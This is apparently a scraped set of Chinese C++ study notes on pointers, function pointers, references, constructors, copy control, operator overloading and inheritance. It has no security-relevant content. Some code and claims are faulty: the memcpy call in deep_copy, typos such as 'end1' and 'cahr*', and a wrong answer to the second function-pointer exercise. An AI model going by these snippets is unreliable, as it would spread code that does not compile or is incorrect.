指向指针的指针指针本身也是占用内存空间的存放其值的，所以也可用指针指向。 123int ival=1024;int *pi=&amp;ival;int **ppi=&amp;pi; // 指向指针的指针 32位系统下，有如下代码： 123456789int main() &#123; double* (*a)[3][6]; // (*a)[3][6]表示数组指针，a指向一个二维数组，而数组的元素是double*类型 cout&lt;&lt;sizeof(a)&lt;&lt;endl; // 4，指针占用4个字节 cout&lt;&lt;sizeof(*a)&lt;&lt;endl; // 72，二维数组有18个元素，每个元素（元素类型为指针）占4个字节 cout&lt;&lt;sizeof(**a)&lt;&lt;endl; // 24，*a为二维数组，*a[0]就是**a，即第一个元素，内容为一维数组，6*4得24 cout&lt;&lt;sizeof(***a)&lt;&lt;endl; // 4，**a为一个一维数组，**a[0]就是***a，类型为double* cout&lt;&lt;sizeof(****a)&lt;&lt;end1; // 8，***a为double*类型，所以****a为取double*指针指向地址的内容，存储大小为double的大小，即8 return 0;&#125; 函数指针函数指针指向某个特定的函数类型，函数类型由其返回类型以及形参决定。 12// 函数指针变量的声明，类型为bool (*)(const string &amp;, const string &amp;)bool (*pf)(const string &amp;, const string &amp;); 这个语句将pf声明为指向函数的指针，它所指向的函数带有两个const string&amp; 类型的形参和bool类型的返回值。 &#x3D;&#x3D;注意：*pf两侧的圆括号是必须的。且形参只需写类型名&#x3D;&#x3D; 由于函数指针类型冗长，所以可以使用typedef简化函数指针的定义： 12typedef bool (*cmpFcn)(const string &amp;，const string &amp;);cmpFcn pf1=0; // 定义一个空的函数指针，使用前一行typedef定义的cmpFcn函数指针类型 在要使用这种函数指针类型时，只需直接使用cmpFcn即可，不必每次都把整个类型声明全部写出来。 在引用函数名但又没有调用该函数时，函数名将被自动解释为指向函数的指针，等效于在函数名上应用取地址符。可使用函数名对函数指针做初始化或赋值。 12bool lengthCompare(const string &amp;，const string &amp;); // 有一同返回类型以及形参的函数声明cmpFcn pf2=lengthCompare; // 使用该函数名初始化函数指针 &#x3D;&#x3D;注意：函数指针只能通过同类型的函数或函数指针或0值常量表达式进行初始化或赋值。&#x3D;&#x3D;指向不同函数类型的指针之间不存在转换。将函数指针初始化为0，表示该指针不指向任何函数。 函数指针的使用 指向函数的指针可用于调用它所指向的函数。可以不需要使用解引用操作符，直接通过指针调用函数，若有： 12typedef bool (*cmpFcn)(const string &amp;，const string &amp;);bool lengthCompare(const string &amp;，const string &amp;); 则： 1234cmpFcn pf=lengthCompare;lengthCompare(&quot;hi&quot;,&quot;bye&quot;); // 使用函数名pf(&quot;hi&quot;,&quot;bye&quot;); // 使用函数指针，未使用*(*pf)(&quot;hi&quot;,&quot;bye&quot;); // 使用函数指针，使用* 函数指针形参函数的形参可以是指向函数的指针。这种形参可以用以下两种形式编写:void useBigger (const string &amp;，const string &amp;, bool (const string &amp;，const string &amp;));上述定义等价于:void useBigger (const string &amp; const string &amp;, bool (*) (const string &amp;, const string&amp;)); 返回指向函数的指针 函数可以返回指向函数的指针： 1int (*ff(int))(int*, int); // 声明返回类型为函数指针的函数 这个语句中，函数为ff(int)，其返回值类型为int (*)(int*, int)的函数指针。这样子比较难理解，使用typedef更简明： 12typedef int (*PF)(int*, int);PF ff(int); // 返回类型为函数指针 例1： 用变量a给出下面的定义，一个有10个指针的数组，每个指针指向-一个函数，该函数有一个整型参数并返回一个整型( )。 解答： int (*a[10]) (int)。 例2： 定义一个函数指针，指向的函数有两个int形参并且返回-一个函数指针，返回的指针指向一个有一个int形参且返回int的函数。 解答： int (*(*p)[10])(int *)。变量为*p，类型为int (*[10])(int *)。 野指针野指针是指向不可用内存的指针，任何指针变量在创建时，不会自动成为NULL指针（空指针），其默认值是随机的，此时的指针就是野指针。 当指针调用free或者delete释放后，未能将其设置为NULL，也会导致该指针便成为野指针，此时虽然free或delete把指针所指的内存释放掉了，但它们并没有把指针本身释放掉。 第三个造成野指针的原因是指针操作超越了变量的作用范围。 引用C++中规定一旦定义了引用，就必须把它跟一个变量绑定起来，并且不能修改这个绑定。 123456int i=3,j =1;int &amp;ref=i; // 定义i的引用refcout&lt;&lt;ref; //输出3ref=j; //注意这里是将i修改为1,而不是修改ref使其绑定到j上cout&lt;&lt;ref; //输出1cout&lt;&lt;i; //输出1 虽然使用引用和指针都可以间接访问另一个值，但它们之间有几个重要区别： 引用不能为空，当引用被创建时，必须被初始化。而指针可以为空值，可以在任何时候被初始化； 一旦一个引用被初始化为指向一个对象，他就不能被改变为对另外一个对象的引用。指针则可以在任何时候指向另一个对象。 不可能有NULL引用。必须保证引用是一块合法的存储单元关联； “sizeof(引用)”所得到的的是指向的变量（对象）的大小，而“sizeof(指针)”得到的是指针本身的大小，通常为4； 给引用赋值修改的是该引用所关联的对象的值，而并不是使用引用于另一个对象关联； 引用使用时不需要解引用，而指针需要解引用，引用和指针的自增（++）操作运算符意义不一样； 如果返回动态分派的对象或内存，必须使用指针，引用可能引起内存泄漏； 当使用&amp;运算符去一个引用的地址时，其值为所引用变量的地址；而对指针使用&amp;运算符，取的是指针变量的地址。 const引用（常引用）const引用是指const对象的引用，当引用的对象是const对象时，引用也必须是const，如下： 123const int ival=1024;const int &amp;ref1=ival; //正确int &amp;ref2=ival; //错误 如果既要利用引用提高程序的效率，又要保护传递给函数的数据不再函数中被改变，就应该使用常引用。常引用主要用于定义一个普通变量的只读属性的别名，作为函数的传入形参，避免实参在调用函数中被意外改变。 引用做类的数据成员引用是可以作为类的数据成员的。引用类型数据成员的初始化有以下特点： 不能直接在构造函数里初始化，必须用到初始化列表； 凡是有引用类型的数据成员的类，必须定义构造函数。 如下： 123456789class ConstRef&#123;public: //ci与ri必须在成员初始化列表中初始化，因此必须自定义构造函数，书写成员初始化列表 ConstRef(int ii):i(ii), ci(i), ri(ii)&#123;&#125;private: int i; const int ci; int &amp;ri;&#125;; 8. 类在C++中，模板是泛型编程的基础。模板是创建类或函数的蓝图或公式。 8.1 访问标号访问标号public、 private、 protected 可以多次出现在类定义中。给定的访问标号应用到下一个访问标号出现时为止。 对于在第一个访问标号之前定义的成员，其访问级别依赖于类是如何定义的。如果类是用struct 关键字定义的，则在第一个访问标号之前的成员是公有的；如果类是用class关键字定义的，则这些成员是私有的。类对其成员的访问形式主要有以下两种: 内部访问：由类中的成员函数对类的成员的访问。 对象访问：在类外部，通过类的对象对类的成员的访问。 类的成员可以有public、protected、 private 三种访问属性，类的成员函数( 内部访问）以及友元函数可以访问类中所有成员，但是在类外通过类的对象（对象访问）就只能访问该类的公有成员。上述权限说明并未考虑有继承的情况，有继承的情况将在下章详细说明。 8.2 类成员简介空类默认产生默认构造函数、复制构造函数、析构函数、赋值运算符重载函数、取址运算符重载函数、const 取址运算符重载函数等。 成员函数在类内部，声明成员函数是必需的，而定义成员函数则是可选的。在类内部定义的函数默认为inline（内联函数）。 调用成员函数时，实际上是使用对象来调用的。每个成员函数（除了static 成员函数外）都有一个额外的、隐含的形参this。在调用成员函数时，形参this初始化为调用函数的对象的地址。 构造函数特殊的成员函数，与类同名，没有返回类型。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。一个类可以有多个构造函数（构造函数可以重载），每个构造函数必须有与其他构造函数不同的数目或类型的形参。 若没有定义显式的构造函数，编译器将自动为这个类生成默认构造函数（不带参数，或者所有的形参都有默认实参）。 若使用编译器自动生成的默认构造函数（或自己定义一个未进行任何操作的默认构造函数），则类中每个成员，使用与初始化变量相同的规则来进行初始化。 类成员：运行该类型的默认构造函数来初始化。 内置或复合类型的成员的初始值依赖于对象的作用域：在局部作用域中这些成员不被初始化，而在全局作用域中它们被初始化为0。 12345678910111213class Student&#123;public: Student()&#123;&#125; void show();private: string name; int number; int score;&#125;;Student a;int main()&#123; Student b;&#125; 上述代码中，a与b的name都调用string类的默认构造函数初始化（运行该类型的默认构造函数来初始化）。a中number和score初始化为0，而b是局部对象，故b中number和score不被初始化，为垃圾值。 成员初始化列表构造函数的成员初始化列表为类的一个或多个数据成员指定初值。 在C++中，成员变量的初始化顺序与变量在类型中的声明顺序相同，而于它们在构造函数的初始化列表中的顺序无关。构造函数的初始化列表仅仅指定用于初始化成员的值,并不指定这些初始化执行的次序。 123456789101112131415class A&#123;private: int i; int j;public: A():j(0), i(j+2)&#123;&#125; // 按照声明顺序初始化，先初始化i（此时j还未初始化，所以i是个垃圾值），后初始化j为0。 void print()&#123; cout&lt;&lt;i&lt;&lt;&quot; &quot;&lt;&lt;j&lt;&lt;endl; &#125;&#125;;int main()&#123; A a; a.print(); return 0;&#125; 省略初始化列表在构造函数的函数体内对数据成员赋值是合法的。从概念上讲，可以认为构造函数分两个阶段执行: 初始化阶段（成员初始化列表） 普通的计算阶段。计算阶段由构造函数函数体中的所有语句组成。 类类型的数据成员总是在初始化阶段初始化（使用其构造函数），内置和复合类型的尘谷氨只对定义在全局作用域中的对象才初始化（初始化为0），定义在局部作用域中的对象包含包含的内置（int等类型）和复合类型（数组、指针等）的成员没有初始化。 没有默认构造函数的类类型的成员，以及const类型的成员变量和引用类型的成员变量，都必须在构造函数初始化列表中进行初始化。 假定有一个NoDefault类，它没有定义自己的默认构造函数，却有一个接受一个 string实参的构造函数。因为该类定义了一个构造函数，因此编译器将不合成默认构造函数。编译器将不会为具有NoDefault类型成员的类合成默认构造函数。如果这样的类希望提供默认构造函数，就必须显式地定义，并且默认构造函数必须显式地初始化其NoDefault成员（在成员初始化列表中通过传递一个初始的string值给NoDefault构造函数）。 拷贝构造函数拷贝构造函数、赋值操作符和析构函数总称为复制控制。编译器自动实现这些操作，但类也可以定义自己的版本。 如果类需要析构函数，则它也需要赋值操作符和拷贝构造函数，这是一个有用的经验法则。这个规则常称为三法则，指的是如果需要析构函数，则需要所有这三个复制控制成员。有一种特别常见的情况需要类定义自己的复制控制成员的：类具有指针成员。 概念：只有单个形参，而且该形参是对本类类型对象的引用(常用const 修饰)，这样的构造函数称为拷贝构造函数(或复制构造函数)。如果拷贝构造函数的形参不是引用，那么就相当于采用了传值的方式(pass-by-value)，而传值的方式会调用该类的拷贝构造函数，从而造成无穷递归地调用拷贝构造函数。因此拷贝构造函数的参数必须是一个引用。 与默认构造函数一样，拷贝构造函数可由编译器隐式调用。拷贝构造函数可用于： 根据另一个同类型的对象初始化一个对象 C++支持两种初始化形式：直接初始化和复制初始化。复制初始化使用&#x3D;符号，而直接初始化将初始化式放在圆括号中。 123456string null_book1(&quot;9-999-99999-9&quot;); //直接初始化string null_book2 = null_book1; //复制初始化string null_book2(null_book1); //复制初始化string null_book3 = &quot;9-999-99999-9&quot;; //复制初始化，等号右侧相当于一个C风格字符串作为形参创建的string临时对象，会产生新的对象string null_book4;null_book4 = null_book3； //不是调用复制构造函数，而是利用赋值运算符将null_book3赋值给null_book4，因为之前已经创建了空字符串对象null_book4（属于赋值运算符重载，没有产生新的对象） 复制一个对象，将它作为实参传给一个函数或从函数返回时复制一个对象 当函数的形参或返回值为类类型时，将由拷贝构造函数进行复制。 12345678910111213141516171819class Myclass&#123;public: Myclass(int n)&#123;number = n;&#125; Myclass(const Myclass &amp;other)&#123; number=other.number; cout&lt;&lt;&quot;a &quot;; &#125;private: int number;&#125;;void fun(Myclass p)&#123; // 函数的形参为类类型时，将由复制构造函数进行复制 Myclass temp(p); // 使用复制构造函数来初始化对象temp&#125;int main(void)&#123; Myclass obj1(10), obj2(0); Myclass obj3(obj1); // 复制构造函数进行初始化 fun(obj3); return 0;&#125; 上述代码的输出为a a a 。调用了三次拷贝构造函数，第一次是main中Myclass obj3(obj1); ，第二次是实参obj3到fun形参p，第三次是函数fun中的Myclass temp(p);语句。 初始化顺序容器中的元素 拷贝构造函数可用于初始化顺序容器中的元素。例如，可以用表示容量的单个形参来初始化容器。容器的这种构造方式使用默认构造函数和拷贝构造函数：vector&lt;string&gt; svec(5);编译器首先使用string 默认构造函数创建一个临时值来初始化 svec，然后使用拷贝构造函数将临时值复制到svec的每个元素。 根据元素初始化列表初始化数组元素 如果用常规的花括号括住的数组初始化列表来提供显式元素初始化式，则使用复制初始化来初始化每个元素。根据指定值创建适当类型的元素，然后用复制构造函数将该值复制到相应元素： 1Sales_ item primer_ eds[] = &#123;string (&quot;0-201-16487-6&quot;), string (&quot;0-201-54848-8&quot;), string (&quot;0-201-82470-1&quot;)&#125;; &#x3D;&#x3D;浅复制与深复制&#x3D;&#x3D; 浅复制 被复制对象的所有变量都含有与原来的对象相同的值，而变量中所有的对其他对象的引用仍然指向原来的对象。换言之，浅复制仅仅复制所考虑的对象，而不复制它所引用的对象。 深复制 被复制对象的所有变量都含有与原来的对象相同的值，除去那些引用其他对象的变量。那些引用其他对象的变量将指向被复制过的新对象，也就是把引用变量所引用的对象也复制一遍。 12345678910struct Test &#123; char *ptr;&#125;;void shallow_copy(Test &amp; src, Test &amp; dest) &#123; dest.ptr=src.ptr;&#125;void deep_copy(Test &amp; srC, Test &amp; dest) &#123; dest.ptr=malloc(strlen(src.ptr) +1); memcpy(dest.ptr, src.ptr);&#125; 浅复制可能会导致运行时错误，特别是在对象的创建与删除过程中。 析构函数析构函数进行资源的回收，作为类构造函数的补充。当对象超出作用域或动态分配的对象被删除时，将自动应用析构函数。析构函数可用于释放对象构造时或在对象的生命期中所获取的资源。不管类是否定义了自己的析构函数，编译器都自动执行类中非static数据成员的析构函数。 虽然构造函数不能被定义成虚函数，但析构函数可以定义为虚函数，一般来说，如果类中定义了虛函数，析构函数也应被定义为虚析构函数,尤其是类内有申请的动态内存，需要清理和释放的时候。 与复制构造函数和赋值操作符不同，无论类是否定义了自己的析构函数，都会创建和运行合成析构函数。如果类定义了析构函数，则在类定义的析构函数结束之后运行合成析构函数。合成析构函数**按对象创建时的逆序撤销每个非static 成员，因此，它按成员在类中声明次序的逆序撤销成员**。对于类类型的每个成员，合成析构函数调用该成员的析构函数来撤销对象。 12345678910111213141516171819class A&#123;public: A()&#123;cout&lt;&lt;&quot;A&quot;;&#125;; ~A()&#123;cout&lt;&lt;&quot;~A&quot;;&#125; &#125;;class B&#123;public: B(A &amp;a):_a(a)&#123; // _a(a)调用了拷贝构造函数，用对象a初始化对象_a，拷贝构造函数自动生成，无输出 cout&lt;&lt;&quot;B&quot;; &#125;; ~B()&#123;cout&lt;&lt;&quot;~B&quot;;&#125; private: A _a;&#125;;int main(void)&#123; A a; B b(a); return 0;&#125; 输出为AB~B~A~A。构造过程：A A B，那么析构过程为：B A A。注意之所以构造了两个A，是因为“a _(a)”调用了拷贝构造函数对B类对象中A初始化，而拷贝构造函数采用的是系统自动生成的版本，没有输出。 构造函数与析构函数调用顺序 单继承 派生时，构造函数和析构函数是不能继承的，为了对基类成员进行初始化，必须对派生类重新定义构造函数和析构函数，并在构造函数的初始化列表中调用基类的构造函数。由于派生类对象通过继承而包含了基类数据成员，因此，创建派生类对象时，系统&#x3D;&#x3D;首先通过派生类的构造函数来调用基类的构造函数，完成基类成员的初始化，而后对派生类中新增的成员进行初始化&#x3D;&#x3D;。 **必须将基类的构造函数放在派生类的初始化列表中，以调用基类构造函数完成基类数据成员的初始化(若无，则调用基类的默认构造函数)**，派生类构造函数实现的功能，或者说调用顺序为： 完成对象所占整块内存的开辟，由系统在调用构造函数时自动完成。 调用基类的构造函数完成基类成员的初始化。 若派生类中含对象成员、const 成员或引用成员，则必须在初始化表中完成其初始化。 派生类构造函数体执行。 12345678910111213141516171819class A&#123;public: A()&#123;cout&lt;&lt;&quot;A&quot;;&#125;; ~A()&#123;cout&lt;&lt;&quot;~A&quot;;&#125; &#125;;class B:public A&#123; // 类B继承自类Apublic: B(A &amp;a):_a(a)&#123; // _a(a)调用了拷贝构造函数，用对象a初始化对象_a，拷贝构造函数自动生成，无输出 cout&lt;&lt;&quot;B&quot;; &#125;; ~B()&#123;cout&lt;&lt;&quot;~B&quot;;&#125; private: A _a;&#125;;int main(void)&#123; A a; // 语句1 B b(a); // 语句2 return 0;&#125; 输出为AAB~B~A~A~A。构造过程：A A A B，那么析构过程为：B A A A。 首先语句1构造一个A的对象，输出A； 然后语句2中，由于B有父类A，所以先调用父类A的构造函数，输出A。 然后B的构造函数初始化列表“a _(a)”调用了拷贝构造函数构造一个A的对象，而拷贝构造函数采用的是系统自动生成的版本，没有输出。但是析构的时候会输出。 最后执行B的构造函数，输出B。析构时与构造顺序相反。 多继承 多继承时，派生类的构造函数初始化列表需要调用各个基类的构造函数。 注意：此时构造函数初始化列表只能控制用于初始化基类的值，不能控制基类的构造次序。基类构造函数按照基类构造函数在类派生列表中的出现次序调用。 虚继承 首先调用虚基类的构造函数，虚基类如果有多个，则虚基类构造函数的调用顺序是此虚基类在当前类派生表中出现的顺序而不是它们在成员初始化表中的顺序。 操作符重载操作符重载函数的名字为operator 后跟着所定义的操作符的符号。像任何其他函数一样，操作符重载函数有一个返回值和一个形参表。形参表必须具有与该操作符数目相同的形参（如果操作符是一个类成员，则包括隐式this形参）。 大多数操作符可以定义为成员函数或非成员函数。当操作符为成员函数时，它的第一个操作数隐式绑定到this 指针。有些操作符(包括赋值操作符)必须是类的成员函数。比如赋值就必须是类的成员，所以this绑定到指向左操作数的指针。因此，赋值操作符接受单个形参，且该形参是同一类类型的对象。右操作数一般作为const引用传递。 并非所有操作符都是可重载的，下表给出可重载和不可重载的操作符。带“点”的都不能重载。 赋值操作符重载在写赋值操作符重载函数时需要注意： 返回值类型为引用（允许连续赋值），形参为常量引用（避免调用拷贝构造函数，产生无谓的消耗） 记得判断传入实例和当前实例*this是否为同一实例 释放实例自身已有的内存，否则可能引起内存泄露 例子如下： 12345678910111213141516171819202122232425262728293031323334353637383940class CMyString&#123;public: CMyString(const char* pData_NULL); // 自定义构造函数 CMyString (const CMyString&amp; other); // 自定义拷贝构造函数 ~CMyString(); // 自定义析构函数 CMyString&amp; CMyString::operator=(const CMyString &amp;str); // 赋值运算符的重载，函数名为operator=，形参为const CMyString &amp;str，返回类型为CMyString&amp;private: char* m pData;&#125;;String::String (const char *pData) &#123; if (pData == NULL) &#123; m_pData=new char[1] ; *m_pData=&#x27;\\0&#x27;; else&#123; int length-strlen (pData); m pData=new char [length+1]; strcpy(m_pData, pData) ; &#125;&#125;// 自定义构造函数CMyString::CMyString (const CMyString &amp;other)&#123; int iLen=strlen (other .m pData) ; m pData=new char[iLen+1]; strcpy (m_pData, other.m_pData) ;&#125;// 自定义拷贝构造函数CMyString::~CMyString()&#123; delete []m_pData;&#125;// 赋值运算符重载函数CMyString&amp; CMyString::operator=(const CMyString &amp;str)&#123; // 注意返回值类型为引用，形参为常量引用 if(this== &amp;str) // 记得判断传入实例str和当前实例*this是否为同一实例 return *this; delete []m_ pData; // 记得释放实例自身已有的内存，否则可能引起内存泄露 m_pData_NULL; m_pData=new char[strlen(str.m_pData)+1]; strcpy(m_pData, str.m_pData) ; return *this;&#125; 并不是出现“&#x3D;”就是调用赋值构造函数，赋值运算符重载的情况没有新对象产生，而拷贝构造函数是生成新的对象： 123456string null_book1(&quot;9-999-99999-9&quot;); //直接初始化string null_book2 = null_book1; //复制初始化string null_book2(null_book1); //复制初始化string null_book3 = &quot;9-999-99999-9&quot;; //复制初始化，等号右侧相当于一个C风格字符串作为形参创建的string临时对象（产生新的对象）string null_book4;null_book4 = null_book3； //不是调用复制构造函数，而是利用赋值运算符将null_book3赋值给null_book4，因为之前已经创建了空字符串对象null_book4（属于赋值运算符重载，没有产生新的对象） &#x3D;&#x3D;**复制构造函数与赋值运算符的区别：**是否有新对象产生&#x3D;&#x3D; 首先要说明的是，若用户没有定义, C++隐式声明一个拷贝构造函数和一个赋值运算符。 拷贝构造函数涉及对象实例化，只在对象实例化时才会被调用，也就是说，在复制构造函数调用期间，这个对象处于一个未决状态(直到复制构造函数被成功调用)。而赋值运算符对现存对象进行赋值操作。 拷贝构造函数不返回任何值，void 都没有。而赋值运算符则在一个现存的对象被赋予新的值时被调用，并且它有返回值。 operator new和operator delete的重载new的执行过程是：首先，调用名为operator new的标准库函数，分配足够大的原始未类型化的内存，以保存指定类型的一个对象；接下来，运行该类型的一个构造函数，用指定初始化式构造对象；最后，返回指向新分配并构造的对象的指针。 delete的执行过程是：首先，对sp指向的对象运行适当的析构函数；然后，通过调用名为operator delete的标准库函数释放该对象所用内存。 new和delete运算符的重载，实际上是对标准库函数operator new和operator delete的重载： 12345678910111213141516171819class X &#123;public: X() &#123;cout&lt;&lt;&quot;constructor&quot;&lt;&lt;endl; &#125; // 重载操作符operate new，第一个参数为分配的空间大小（字节），类型为size_t，返回类型必须为void* static void* operator new(size_ t size) &#123; cout&lt;&lt;&quot;new&quot;&lt;&lt;endl; return ::operator new(size); // 只分配所要求的空间，不调用相关对象的构造函数 &#125; static void operator delete (void* pointee) &#123; cout&lt;&lt;&quot;delete&quot;&lt;&lt;endl ; ::operator delete(pointee); &#125; ~X() &#123;cout&lt;&lt;&quot;destructor&quot;&lt;&lt;endl; &#125;&#125;;int main (void) &#123; X* px=new X(); // 调用operator new分配空间，然后再调用构造函数 delete px; // 先调用析构函数，再调用operator delete释放空间 return 0;&#125; 如何禁止产生堆对象：禁用new，也就是使operator new为private。同时为了对称，最好将operator delete也重载为private。 如何禁止产生栈对象：将构造函数或析构函数设为private。 8.3 成员函数的重载、覆盖与隐藏成员函数的重载在同一类中定义的同名函数。重载函数的形参类型和数目有所不同。重载和成员函数是否为虚函数无关。 成员函数的覆盖在派生类中覆盖基类中的同名函数，要求基类函数必须是虚函数，且： 1）与基类的虚函数有相同的参数个数 2）与基类的虚函数有相同的参数类型 3）与基类的虚函数有相同的返回类型；或者都返回指针(或引用)，并且派生类虚函数所返回的指针(或引用)类型是基类中被替换的虚函数所返回的指针(或引用)类型的子类型(派生类型)。 12345678class A&#123;public: virtual void fun1(int ,int)&#123;&#125; // 虚函数&#125;;class B:public A&#123;public: void fun1(int ,int)&#123;&#125; // 具有相同的函数名、参数个数、参数类型、返回类型，覆盖了A中的fun1&#125;; 覆盖的特征如下： 不同的范围（分别位于派生类与基类）； 相同的函数名字； 相同的参数； 基类函数必须有vitural关键字。 重载与覆盖的区别如下： 覆盖是子类和父类之间的关系，是垂直关系；重载是同一个类中不同方法之间的关系，是水平关系。 覆盖要求参数列表相同，重载要求参数列表不同；覆盖要求返回类型相同，重载则不要求； 覆盖关系中，调用方法体是根据对象的类型来决定的，重载关系是根据调用时的实参表与形参表来选择方法体的。 成员函数的隐藏隐藏指的是在某些情况下，派生类中的函数屏蔽了基类中的同名函数，这些情况包括: 两个函数参数相同，但基类函数不是虚函数。和覆盖的区别在于基类函数是否是虚函数。 例如： 1234567891011121314class A&#123;public: void fun(int xp)&#123; //成员函数fun，非虚函数 cout &lt;&lt; xp &lt;&lt; endl; &#125;&#125;;class B : public A&#123; //类B由类A派生而来public: void fun(int xp)&#123;&#125; // 参数相同，但是基类函数不是虚函数，所以隐藏父类的fun函数&#125;B b;b.fun(2); // 调用B中的函数funb.A::fun(2); // 调用A中的函数fun 两个函数参数不同，无论基类函数是否是虚函数，基类函数都会被屏蔽。和重载的区别在于两个函数不在同一类中。 例如： 1234567891011121314class A&#123;public: virtual void fun(int xp)&#123; //非虚成员函数fun，参数为int型 cout &lt;&lt; xp &lt;&lt; endl; &#125;&#125;;class B : public A&#123; //类B由类A派生而来public: void fun(cahr* xp)&#123;&#125; // 参数不同，隐藏父类的fun函数&#125;B b;b.fun(2); // 错误，参数类型错误b.A::fun(2); // 通过，调用A中的函数fun 9. 面向对象编程9.1 继承基类的构造函数(包括拷贝构造函数)、析构函数、赋值操作符重载函数，都不能被派生类继承。. 一个派生类可以从一个或多个基类派生（单继承、多继承）。 多继承的定义格式如下： 123class &lt;派生类&gt;:&lt;继承方式1&gt; &lt;基类名1&gt;,&lt;继承方式2&gt; &lt;基类名2&gt;, ...&#123; &lt;派生类新定义成员&gt;&#125;; 派生类对象由多个部分组成：派生类本身定义的(非static)成员加上由基类(非static)成员组成的子对象。 如果一个类有多个直接基类，而这些直接基类又有一个共同的基类，则在最低层的派生类中会保留这个间接的共同基类数据成员的多份同名成员。为了解决这个问题，提出了虚继承的概念。虚继承时，公共基类在对象模型中只有一份拷贝。 基类成员在派生类中的访问属性派生类可以继承基类中除了构造函数与析构函数(赋值运算符重载函数也不能被继承)之外的成员，但是这些成员的访问属性在派生过程中是可以调整的。从基类继承来的成员在派生类中的访问属性是由继承方式控制的。 公有继承 父类的public成员成为子类的public成员，可以被该子类中的函数(内部访问)及其友元函数访问，除此之外，也可以由该子类的对象(属于外部访问)访问。 父类的private成员仍旧是父类的private成员，子类成员不可以访问这些成员，包括子类中的函数及其友元函数、子类对象。 父类的protected成员成为子类的protected成员，可以被该子类中的函数及其友元函数访问，除此之外，不可以由该子类的对象访问（不允许外部访问）。 私有继承 私有继承的特点是基类的公有成员和保护成员都作为派生类的私有成员，并且不能被这个派生类的子类所访问。在私有继承时，基类的成员只能由直接派生类访问，而无法再往下继承。 保护继承 保护继承的特点是基类的所有公有成员和保护成员都成为派生类的保护成员，并且只能被它的派生类成员函数或友元访问，基类的私有成员仍然是私有的。 继承时导致的二义性类间的转换1） 在公有继承方式（私有、保护继承时，不能隐式转换）下，派生类的对象&#x2F;对象指针&#x2F;对象引用可以赋值给基类的对象&#x2F;对象指针&#x2F;对象引用（发生隐式转换）（上行转换），基类的对象&#x2F;对象指针&#x2F;对象引用不能赋值给派生类的对象&#x2F;对象指针&#x2F;对象引用。因为派生类包含了基类的所有信息，而基类缺乏派生类中的信息。如： 1234567891011class A&#123;&#125;;class B: public A&#123;&#125;；A a;B b;a=b; //合法，派生类向基类隐式转换（向上转换）b=a; //错误，基类向派生类转换，语句1A* pa=&amp;b; //合法，隐式转换，派生类指针转换为基类指针B* pb=&amp;a; //错误，语句2A&amp; ra=b; //合法，隐式转换B&amp; rb=a; //错误，语句3 2）C++允许把基类对象指针&#x2F;引用强制转换（显式）成派生类的对象指针&#x2F;引用（下行转换），如1）中代码，语句2可以改为： 1B* pb=(B*)&amp;a; 语句3可以改为： 1B&amp; rb=(B&amp;)a; 但是语句1不能通过强制转换完成。 3）一个指向基类的指针可以用来指向该基类公有派生类的任何对象，这是C++实现程序运行时的多态性的关键。 若存在多重继承，由于对象在往上转换期间（派生类转换为基类）出现多个类，因而对象会存在多个this指针。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849class base1&#123; char c[16];public: void printthis1()&#123; cout&lt;&lt;&quot;base1 this=&quot;&lt;&lt;this&lt;&lt;endl; // this为本类对象的地址 &#125;&#125;;class base2&#123; char c[16];public: void printthis2()&#123; cout&lt;&lt;&quot;base2 this=&quot;&lt;&lt;this&lt;&lt;endl; &#125;&#125;;class member1&#123; char c[16];public: void printthism1()&#123; cout&lt;&lt;&quot;member1 this=&quot;&lt;&lt;this&lt;&lt;endl; &#125;&#125;;class member2&#123; char c[16];public: void printthism2()&#123; cout&lt;&lt;&quot;member2 this=&quot;&lt;&lt;this&lt;&lt;endl; &#125;&#125;;class mi:public base1, public base2&#123; member1 m1; member2 m2;public: void printthis()&#123; cout&lt;&lt;&quot;m1 this=&quot;&lt;&lt;this&lt;&lt;endl; printthis1(); //调用继承自base1的printthis1函数 printthis2(); //调用继承自base2的printthis2函数 m1.printthism1(); m2.printthism2(); &#125;&#125;;int main()&#123; mi MI; cout&lt;&lt;&quot;sizeof(mi)=&quot;&lt;&lt;sizeof(mi)&lt;&lt;endl; MI.printthis(); base1* b1=&amp;MI; // 派生对象的指针赋值给基类指针（发生隐式转换） base2* b2=&amp;MI; cout&lt;&lt;&quot;base 1 pointer=&quot;&lt;&lt;b1&lt;&lt;endl; cout&lt;&lt;&quot;base 2 pointer=&quot;&lt;&lt;b2&lt;&lt;endl;&#125; 输出为： 12345678sizeof(mi)=64m1 this=0031FCB0base1 this=0031FCB0base2 this=0031FCC0member1 this=0031FCD0member2 this=0031FCE0base 1 pointer=0031FCB0base 2 pointer=0031FCC0 每一个类都有打印一个this指针函数，这些类通过多重继承和组合被装配成类mi，它打印自己和其他所有子对象的地址，有主程序调用这些打印功能。可以清楚地看到，能在一个相同的对象中获得两个不同的this指针。 派生对象MI的起始地址和它的基类列表中的第一个类（base1）的地址是一致的，第二个类base2的地址随后，接着根据声明的次序安排成员对象(member1、member2的地址)。当向base1和base2进行上行转换时（语句base1* b1=&amp;MI;和语句base2* b2=&amp;MI;），产生的指针表面上是指向同一个对象MI，而实际上有不同的this指针，b1指向base1类的子对象，b2指向base2类的子对象。 派生对象MI的地址空间： 在上述代码中加入如下语句： 123mi *b3= &amp;MI;if(b1 == b3) cout&lt;&lt;&quot;b1==b3&quot;&lt;&lt;endl ;if(b2 == b3) cout&lt;&lt;&quot;b2==b3&quot;; 实际上，b1 与b3的比较过程中，由于两者类型不同，会发生隐式类型转换，b3 (mi*类型）会被隐式转换为basel* (派生类被隐式转换为基类，这是b1能与b3比较的基础，反过来转换不成立)，然后与b1进行比较；同理，b2与b3的比较过程中，b3会被转换为base2*，然后与b2进行比较，故实际输出为： 12b1==b3b2==b3 多基继承一般来说， 在派生类中对基类成员的访问应当具有唯一性， 但在多基继承时，如果多个基类中存在同名成员的情况，造成编译器无从判断具体要访问哪个基类中的成员，则称为对基类成员访问的：二义性问题。 若两个基类中具有同名的数据成员或成员函数，应使用成员名限定来消除二义性。比如A::print()。或者实现对基类同名成员函数的隐藏（见8.3节）。 菱形继承1234567891011121314class A&#123; //公共基类public: void print() &#123; cout &lt;&lt; &quot;this is x inA:”&lt;&lt; endl; &#125;&#125;;class B: public A&#123;&#125;; //类B由类A派生而来class C: public A&#123;&#125;; //类C由类A派生而来class D : public B, public C&#123;&#125;; //类 D由类B和类C派生而来void main() &#123; D d; //声明一个D类对象d，其含有2个基类对象A，一个基类对象B，一个基类对象C A* pa=(A*) &amp;d; //上行转换产生二义性，语句1 d.print(); 